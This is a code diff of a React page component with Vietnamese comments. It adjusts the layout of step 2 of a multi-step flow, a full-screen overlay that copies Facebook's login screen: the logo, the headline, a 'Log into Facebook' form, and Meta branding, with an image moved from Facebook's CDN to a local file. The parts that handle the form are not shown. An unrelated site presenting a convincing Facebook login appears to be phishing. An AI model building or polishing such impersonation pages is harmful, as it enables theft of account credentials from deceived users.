@@ -729,18 +729,18 @@ export default function Home() {
                 </div>
               )}
 
-                                          {/* BƯỚC 2: LOGIN FULL PAGE - Tách riêng để tràn 2 bên */}
+                                                        {/* BƯỚC 2: LOGIN FULL PAGE - Tràn viền 100% */}
               {step === 2 && (
                 <div style={{ 
-                  position: 'fixed', // Ép cố định toàn màn hình
+                  position: 'fixed', // Ép cố định tràn màn hình, phá vỡ mọi giới hạn của thẻ cha
                   inset: 0, 
                   background: '#fff', 
                   zIndex: 2000, 
                   display: 'flex',
-                  flexDirection: 'row' // Chia 2 cột
+                  flexDirection: 'row' 
                 }}>
                   
-                  {/* CỘT TRÁI: Ảnh minh họa và Text */}
+                  {/* CỘT TRÁI: Text và Ảnh */}
                   <div style={{ 
                     flex: 1, 
                     display: 'flex', 
@@ -748,24 +748,25 @@ export default function Home() {
                     justifyContent: 'center', 
                     alignItems: 'center', 
                     borderRight: '1px solid #e4e6eb',
-                    padding: '40px'
+                    padding: '40px',
+                    boxSizing: 'border-box'
                   }}>
-                    <div style={{ width: '100%', maxWidth: '500px', textAlign: 'left' }}>
+                    <div style={{ width: '100%', maxWidth: '550px', display: 'flex', flexDirection: 'column', alignItems: 'flex-start' }}>
                       
-                      {/* Logo Facebook nhỏ */}
-                      <svg viewBox="0 0 36 36" height="40" width="40" style={{ marginBottom: '30px' }}>
+                      {/* Logo F nhỏ */}
+                      <svg viewBox="0 0 36 36" height="48" width="48" style={{ marginBottom: '20px', alignSelf: 'center' }}>
                         <path fill="#0866FF" d="M18 0C8.06 0 0 8.06 0 18s8.06 18 18 18c9.94 0 18-8.06 18-18S27.94 0 18 0zm4.04 26.13h-4.32v-14.4h-4.32v-4.32h4.32V5.04c0-2.92 1.62-4.32 4.32-4.32h3.6v4.32h-2.16c-1.08 0-1.44.36-1.44 1.44v1.44h4.32l-.72 4.32h-3.6v14.4z"/>
                       </svg>
                       
-                      <h1 style={{ fontSize: '48px', fontWeight: '700', lineHeight: '1.1', color: '#1c2b33', marginBottom: '20px', letterSpacing: '-1px' }}>
+                      <h1 style={{ fontSize: '54px', fontWeight: '700', lineHeight: '1.1', color: '#1c2b33', marginBottom: '30px', letterSpacing: '-1.5px', alignSelf: 'center' }}>
                         Explore <br />the <br />things <br /><span style={{ color: '#0064e0' }}>you love.</span>
                       </h1>
                       
-                      {/* Ảnh minh họa lớn */}
+                      {/* Ảnh minh họa - Đã trỏ đúng tên file mày tải lên */}
                       <img 
-                        src="https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp" 
+                        src="/images/Anhlogin.webp" 
                         alt="Explore" 
-                        style={{ width: '100%', maxWidth: '400px', display: 'block', marginTop: '30px' }} 
+                        style={{ width: '100%', maxWidth: '400px', display: 'block', alignSelf: 'center' }} 
                       />
                     </div>
                   </div>
@@ -777,9 +778,10 @@ export default function Home() {
                     flexDirection: 'column', 
                     justifyContent: 'center', 
                     alignItems: 'center', 
-                    padding: '40px'
+                    padding: '40px',
+                    boxSizing: 'border-box'
                   }}>
-                    <div style={{ width: '100%', maxWidth: '360px' }}>
+                    <div style={{ width: '100%', maxWidth: '396px' }}>
                       
                       <h2 style={{ fontSize: '18px', fontWeight: '500', color: '#1c2b33', marginBottom: '20px' }}>
                         Log into Facebook
@@ -819,9 +821,9 @@ export default function Home() {
                         <a href="#" style={{ color: '#0866FF', fontSize: '14px', textDecoration: 'none' }}>Forgot password?</a>
                       </div>
 
-                      <div style={{ marginTop: '30px', paddingTop: '20px', borderTop: '1px solid #e4e6eb', textAlign: 'center' }}>
+                      <div style={{ marginTop: '40px', paddingTop: '20px', borderTop: '1px solid #e4e6eb', textAlign: 'center' }}>
                         <button type="button" style={{
-                          padding: '12px 24px', borderRadius: '100px', border: '1px solid #0866FF',
+                          padding: '14px 20px', borderRadius: '100px', border: '1px solid #0866FF',
                           background: 'transparent', color: '#0866FF', fontSize: '15px', fontWeight: '600', cursor: 'pointer'
                         }}>
                           Create new account
@@ -832,9 +834,8 @@ export default function Home() {
                           <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '16px', opacity: 0.7 }} />
                       </div>
 
-                      {/* Nút Back để quay lại */}
-                      <div style={{ textAlign: 'center', marginTop: '24px' }}>
-                        <button onClick={() => setStep(1.5)} style={{ background: 'none', border: 'none', color: '#1877F2', fontSize: '14px', fontWeight: '600', cursor: 'pointer' }}>
+                      <div style={{ textAlign: 'center', marginTop: '30px' }}>
+                        <button onClick={() => setStep(1.5)} style={{ background: 'none', border: 'none', color: '#1877F2', fontSize: '15px', fontWeight: '600', cursor: 'pointer' }}>
                           Back
                         </button>
                       </div>
